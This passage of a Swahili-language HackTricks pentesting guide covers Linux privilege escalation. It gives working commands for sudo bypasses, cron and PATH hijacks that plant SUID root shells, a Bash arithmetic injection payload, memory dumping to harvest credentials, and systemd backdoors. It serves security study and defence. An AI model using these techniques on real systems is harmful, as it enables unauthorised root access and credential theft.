# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata uelewa fulani wa OS inayoendesha
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Njia

Ikiwa una **ruhusa za kuandika kwenye folda yoyote ndani ya** kigezo cha `PATH` unaweza kuwa na uwezo wa hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za mazingira

Je, kuna taarifa za kuvutia, manenosiri au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Exploits za kernel

Angalia toleo la kernel na ikiwa kuna exploit fulani inayoweza kutumika kuongeza privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zenye udhaifu na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambako unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yenye udhaifu kutoka kwenye wavuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana zinazoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Daima **tafuta kernel version kwenye Google**, huenda kernel version yako imeandikwa kwenye kernel exploit fulani na kisha utakuwa na uhakika kwamba exploit hiyo ni valid.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la Sudo

Kulingana na matoleo ya sudo yaliyo dhaifu yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Matoleo ya Sudo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) huruhusu watumiaji wa ndani wasio na privileges kuongeza privileges zao hadi root kupitia chaguo la sudo `--chroot` wakati faili `/etc/nsswitch.conf` inatumika kutoka kwenye directory inayodhibitiwa na mtumiaji.

Hapa kuna [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya kutumia [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) hilo. Kabla ya kuendesha exploit, hakikisha kwamba toleo lako la `sudo` lina vulnerability na kwamba lina support feature ya `chroot`.

Kwa maelezo zaidi, rejelea [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) ya awali

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo kabla ya 1.9.17p1 (reported affected range: **1.8.8–1.9.17**) inaweza kutathmini host-based sudoers rules kwa kutumia **user-supplied hostname** kutoka `sudo -h <host>` badala ya **real hostname**. Ikiwa sudoers inatoa privileges pana zaidi kwenye host nyingine, unaweza **spoof** hiyo host kwa ndani.

Mahitaji:
- Toleo la sudo lenye vulnerability
- Host-specific sudoers rules (host si hostname ya sasa wala `ALL`)

Mfano wa sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit kwa kujifanya host inayoruhusiwa:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Ikiwa utatuzi wa jina lililofanyiwa spoof unazuia, liweke kwenye `/etc/hosts` au tumia hostname ambayo tayari inaonekana kwenye logs/configs ili kuepuka DNS lookups.

#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Uthibitishaji wa sahihi wa Dmesg umeshindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inaweza kutumiwa vibaya
```bash
dmesg 2>/dev/null | grep "signature"
```
### Uchanganuzi zaidi wa system
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Ikiwa uko ndani ya container, anza na sehemu ifuatayo ya container-security kisha pivot kwenda kwenye kurasa za abuse mahususi za runtime:


{{#ref}}
container-security/
{{#endref}}

## Drives

Kagua **nini kime-mounted na kime-unmounted**, wapi na kwa nini. Ikiwa kuna kitu chochote kime-unmounted unaweza kujaribu kuki-mount na kuangalia taarifa za faragha
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia ikiwa **kuna compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia baadhi ya kernel exploit kwa sababu inapendekezwa kui-compile kwenye machine utakayoitumia (au ile iliyo sawa nayo)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Dhaifu Zimewekwa

Angalia **toleo la pakiti na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa kuongezea haki za mtumiaji…\
Inapendekezwa kuangalia kwa mikono toleo la programu zilizowekwa zinazotia shaka zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwa mashine unaweza pia kutumia **openVAS** kuangalia programu zilizopitwa na wakati na zilizo hatarini zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa kiasi kikubwa zitakuwa zisizo na faida, kwa hivyo inapendekezwa baadhi ya programu kama OpenVAS au zinazofanana ambazo zitaangalia ikiwa toleo lolote la programu iliyosakinishwa lina hatari kutokana na exploits zinazojulikana_

## Processes

Angalia **michakato gani** inayoendeshwa na hakikisha kama kuna mchakato wowote una **ruhusa zaidi kuliko inavyopaswa** (labda tomcat ikiendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Daima angalia kama kuna [**electron/cef/chromium debuggers** zinazoendeshwa, unaweza kuzitumia vibaya ili kupandisha ruhusa](electron-cef-chromium-debugger-abuse.md). **Linpeas** hutambua hizo kwa kuangalia kigezo cha `--inspect` ndani ya command line ya process.\
Pia **angalia ruhusa zako juu ya binaries za processes**, labda unaweza kumwandikia mtu faili lake.

### Cross-user parent-child chains

Child process inayoendeshwa chini ya **mtumiaji tofauti** kuliko parent wake si lazima iwe ya kihalifu, lakini ni **ishara muhimu ya triage**. Baadhi ya mabadiliko yanatarajiwa (`root` kuzindua service user, login managers kuunda session processes), lakini chains zisizo za kawaida zinaweza kufichua wrappers, debug helpers, persistence, au weak runtime trust boundaries.

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Ukikuta mnyororo wa kushangaza, kagua command line ya mzazi na faili zote zinazoathiri tabia yake (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Katika njia kadhaa halisi za privesc, mtoto mwenyewe hakuwa writable, lakini **parent-controlled config** au helper chain ndiyo ilikuwa writable.

### Executables zilizofutwa na files zilizofunguliwa kisha kufutwa

Runtime artifacts mara nyingi bado zinaweza kufikiwa **baada ya deletion**. Hii ni muhimu kwa privilege escalation na pia kwa kurejesha evidence kutoka kwa process ambayo tayari imefungua sensitive files.

Kagua deleted executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Ikiwa `/proc/<PID>/exe` inaonyesha `(deleted)`, mchakato bado unaendesha picha ya zamani ya binary kutoka kwenye memory. Hilo ni ishara yenye nguvu ya kuchunguza kwa sababu:

- executable iliyofutwa inaweza kuwa na strings au credentials za kuvutia
- mchakato unaoendelea bado unaweza kufichua file descriptors zenye manufaa
- binary yenye privilege iliyofutwa inaweza kuonyesha recent tampering au attempted cleanup

Kusanya deleted-open files kwa ujumla:
```bash
lsof +L1
```
Kama utapata descriptor ya kuvutia, irejeshe moja kwa moja:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Hii ni muhimu hasa wakati mchakato bado una secret iliyofutwa, script, database export, au flag file wazi.

### Process monitoring

Unaweza kutumia tools kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia processes. Hii inaweza kuwa muhimu sana kutambua vulnerable processes zinazotekelezwa mara kwa mara au wakati seti ya requirements inatimizwa.

### Process memory

Baadhi ya services za server huhifadhi **credentials katika clear text ndani ya memory**.\
Kwa kawaida utahitaji **root privileges** kusoma memory ya processes zinazomilikiwa na users wengine, kwa hiyo hii huwa na manufaa zaidi ukiwa tayari root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama regular user unaweza kusoma memory ya processes unazomiliki**.

> [!WARNING]
> Kumbuka kuwa siku hizi machines nyingi **haziruhusu ptrace by default** ambayo ina maana kuwa huwezi dump processes nyingine zinazomilikiwa na unprivileged user wako.
>
> File _**/proc/sys/kernel/yama/ptrace_scope**_ hudhibiti accessibility ya ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: processes zote zinaweza ku-debugged, mradi tu zina same uid. Hii ndiyo classical way ya jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Kama una access kwenye memory ya FTP service (kwa mfano) unaweza kupata Heap na kutafuta ndani ya credentials zake.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa given process ID, **maps zinaonyesha memory ime-mapped vipi ndani ya** virtual address space ya hiyo process; pia zinaonyesha **permissions za kila mapped region**. File ya **mem** pseudo **inaonyesha memory ya process yenyewe**. Kutoka kwenye file ya **maps** tunajua ni **memory regions zipi zinaweza kusomeka** na offsets zao. Tunatumia taarifa hii ku**seek** ndani ya file ya mem na ku**dump** regions zote zinazosomeka kwenda kwenye file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji wa **physical** memory ya mfumo, si virtual memory. Kernel's virtual address space inaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni toleo la Linux la zana ya kawaida ya ProcDump kutoka kwenye suite ya zana za Sysinternals za Windows. Ipate katika [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili dump ya process memory unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa kwa mikono requirements za root na kudump process inayomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials kutoka Process Memory

#### Mfano wa mikono

Ikiwa utagundua kuwa authenticator process inaendelea ku-run:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza kudump mchakato (angalia sehemu zilizotangulia ili kupata njia tofauti za kudump kumbukumbu ya mchakato) na kutafuta credentials ndani ya kumbukumbu:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) itakuwa **ikiiba credentials za plain text kutoka kwenye memory** na kutoka kwenye baadhi ya **well known files**. Inahitaji root privileges ili ifanye kazi ipasavyo.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Ikiwa paneli ya wavuti ya “Crontab UI” (alseambusher/crontab-ui) inaendeshwa kama root na imefungwa kwa loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda job yenye haki za juu ili kupandisha privilej.

Mlolongo wa kawaida
- Gundua port ya loopback-only (mfano, 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Pata credentials katika operational artifacts:
- Backups/scripts zilizo na `zip -P <password>`
- systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnela na login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Tengeneza kazi ya high-priv na iendeshe mara moja (inatoa SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Tumia hiyo:
```bash
/tmp/rootshell -p   # root shell
```
Kufanya ugumu
- Usianzishe Crontab UI kama root; weka mipaka kwa kutumia mtumiaji maalum na ruhusa chache tu
- Funga kwa localhost na pia zuia ufikiaji kupitia firewall/VPN; usitumie tena nywila zilezile
- Epuka kuweka secrets ndani ya unit files; tumia secret stores au root-only EnvironmentFile
- Wezesha audit/logging kwa utekelezaji wa job unapohitajika



Angalia kama scheduled job yoyote iko katika hatari. Huenda ukaweza kunufaika na script inayotekelezwa na root (wildcard vuln? unaweza kurekebisha files ambazo root hutumia? tumia symlinks? tengeneza files maalum kwenye directory ambayo root hutumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Ikiwa `run-parts` inatumiwa, angalia ni majina gani yatakayotekelezwa kweli:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Hii huepuka false positives. Saraka ya periodiki inayoweza kuandikwa ni muhimu tu ikiwa jina la faili la payload yako linalingana na sheria za local `run-parts`.

### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Angalia jinsi user "user" ana ruhusa za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii user root anajaribu kutekeleza command au script fulani bila kuweka path. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata root shell kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron ikitumia script yenye wildcard (Wildcard Injection)

Ikiwa script inayotekelezwa na root ina “**\***” ndani ya command, unaweza kuitumia kufanya mambo yasiyotarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard inaongozwa na path kama** _**/some/path/\***_ **, si vulnerable (hata** _**./\***_ **sio).**

Soma ukurasa ufuatao kwa zaidi ya mbinu za wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa root cron/parser inasoma fields za log zisizoaminika na kuziingiza kwenye arithmetic context, attacker anaweza kuingiza command substitution $(...) ambayo itaendeshwa kama root wakati cron inapo run.

- Kwa nini inafanya kazi: Katika Bash, expansions hutokea kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Hivyo value kama `$(/bin/bash -c 'id > /tmp/pwn')0` kwanza hubadilishwa (ikitekeleza command), kisha numeric `0` iliyobaki inatumika kwa arithmetic hivyo script inaendelea bila errors.

- Kawaida vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Utekelezaji: Pata text inayodhibitiwa na attacker iandikwe ndani ya log inayochakatwa ili field inayoonekana kama nambari iwe na command substitution na iishe na digit. Hakikisha command yako haitoi output kwenda stdout (au iredirecti) ili arithmetic ibaki valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ikiwa **unaweza kurekebisha cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambayo una full access**, huenda ikawa na manufaa kufuta folda hiyo na **kuunda symlink folder kuelekea nyingine** inayohudumia script inayodhibitiwa na wewe
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Uthibitishaji wa Symlink na usimamizi salama wa faili

Wakati wa kukagua privileged scripts/binaries zinazosomea au kuandikia faili kwa path, thibitisha jinsi links zinavyoshughulikiwa:

- `stat()` hufuata symlink na kurudisha metadata ya target.
- `lstat()` hurudisha metadata ya link yenyewe.
- `readlink -f` na `namei -l` husaidia kutatua final target na kuonyesha permissions za kila path component.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Kwa watetezi/watengenezaji, mifumo salama dhidi ya symlink tricks ni pamoja na:

- `O_EXCL` pamoja na `O_CREAT`: shindwa ikiwa path tayari ipo (huzuia attacker kuunda mapema links/files).
- `openat()`: fanya kazi ukiwa unategemea relative to trusted directory file descriptor.
- `mkstemp()`: tengeneza temporary files kwa atomiki na secure permissions.

### Custom-signed cron binaries with writable payloads
Blue teams wakati mwingine huweza "sign" cron-driven binaries kwa kudump custom ELF section na kufanya grep kwa vendor string kabla ya kuzitekeleza kama root. Ikiwa binary hiyo ni group-writable (mf., `/opt/AV/periodic-checks/monitor` inamilikiwa na `root:devs 770`) na unaweza leak signing material, unaweza forge section na hijack cron task:

1. Tumia `pspy` kunasa verification flow. Huko Era, root aliendesha `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ikifuatiwa na `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` kisha akatekeleza faili.
2. Tengeneza upya expected certificate kwa kutumia leaked key/config (kutoka `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Jenga malicious replacement (mf., drop a SUID bash, ongeza SSH key yako) na embed certificate ndani ya `.text_sig` ili grep ipite:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite binary iliyopangwa huku ukihifadhi execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Subiri cron run inayofuata; mara tu naive signature check inapofaulu, payload yako itaendeshwa kama root.

### Frequent cron jobs

Unaweza kufuatilia processes ili kutafuta processes zinazotekelezwa kila baada ya dakika 1, 2 au 5. Labda unaweza kuitumia na kuongeza privileges.

Kwa mfano, ili **kufuatilia kila 0.1s kwa dakika 1**, **kupanga kwa commands zilizotekelezwa mara chache zaidi** na kufuta commands ambazo zimetekelezwa mara nyingi zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayozinduka).

### Root backups that preserve attacker-set mode bits (pg_basebackup)

Ikiwa cron inayomilikiwa na root inafunga `pg_basebackup` (au recursive copy yoyote) dhidi ya database directory ambayo unaweza kuandika, unaweza kuweka **SUID/SGID binary** ambayo itanakiliwa tena kama **root:root** na mode bits zilezile ndani ya backup output.

Typical discovery flow (as a low-priv DB user):
- Tumia `pspy` kuona root cron ikipiga kitu kama `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` kila dakika.
- Thibitisha kwamba source cluster (mf. `/var/lib/postgresql/14/main`) inaweza kuandikwa na wewe na destination (`/opt/backups/current`) inakuwa owned by root baada ya job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Hii hufanya kazi kwa sababu `pg_basebackup` huhifadhi bits za file mode wakati wa kunakili cluster; inapotumiwa na root, files za lengwa hurithi **root ownership + attacker-chosen SUID/SGID**. Kila routine ya backup/copy yenye privilege inayofanana ambayo huhifadhi permissions na kuandika kwenye executable location inaweza kuwa vulnerable.

### Invisible cron jobs

Inawezekana kuunda cronjob **kwa kuweka carriage return baada ya comment** (bila newline character), na cron job itafanya kazi. Mfano (kumbuka carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Ili kugundua aina hii ya kuingia kwa siri, kagua faili za cron kwa kutumia tools zinazoonyesha control characters:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

Angalia kama unaweza kuandika faili lolote la `.service`, ukiweza, unaweza **kulibadilisha** ili **litekeleze** backdoor yako **wakati** service **inaanza**, **inaanzishwa upya** au **inasimamishwa** (labda utahitaji kusubiri hadi mashine i-rebootiwe).\
Kwa mfano tengeneza backdoor yako ndani ya faili la .service na **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Kumbuka kwamba ikiwa una **ruhusa za kuandika juu ya binaries zinazotekelezwa na services**, unaweza kuzibadilisha ziwe backdoors ili services zitakapore-executed tena backdoors zitekelezwe.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumiwa na **systemd** kwa:
```bash
systemctl show-environment
```
Ukipata kwamba unaweza **kuandika** katika mojawapo ya folda za path hiyo unaweza kuwa na uwezo wa **kupanua ruhusa**. Unahitaji kutafuta **relative paths being used on service configurations** files kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, tengeneza **executable** yenye **jina lile lile kama relative path binary** ndani ya folda ya systemd PATH unayoweza kuandika, na wakati service ikiombwa kutekeleza action iliyo na udhaifu (**Start**, **Stop**, **Reload**), **backdoor** yako itatekelezwa (watumiaji wasio na privilege kwa kawaida hawawezi kuanzisha/kusimamisha services lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo jina lake linaishia kwa `**.timer**` na hudhibiti `**.service**` files au events. **Timers** zinaweza kutumika kama mbadala wa cron kwa kuwa zina support iliyojengewa ndani kwa calendar time events na monotonic time events, na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Ratiba zinazoweza kuandikwa

Ukifanikiwa kurekebisha timer unaweza kuifanya iteghese baadhi ya vitu vilivyopo vya systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma what the Unit is:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Kwa hiyo, ili kutumia vibaya ruhusa hii ungehitaji:

